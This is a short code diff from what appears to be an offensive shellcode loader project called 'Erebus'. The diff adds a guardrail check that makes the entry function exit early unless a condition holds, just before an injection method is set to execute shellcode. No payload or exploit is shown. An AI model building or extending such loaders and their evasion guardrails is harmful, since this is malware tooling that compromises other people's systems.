@@ -1,3 +1,4 @@
+#include "guardrail.hpp"
 #include "../include/shellcode.hpp"
 #include "../include/loader.hpp"
 // #include "../include/config.hpp" # Already imported in loader.hpp
@@ -7,6 +8,8 @@
 // =========================================================================
 VOID entry(void)
 {
+	if (!ErebusGuardrail()) return;
+
 	erebus::config.injection_method = ExecuteShellcode;
 
 	HANDLE process_handle = NULL;
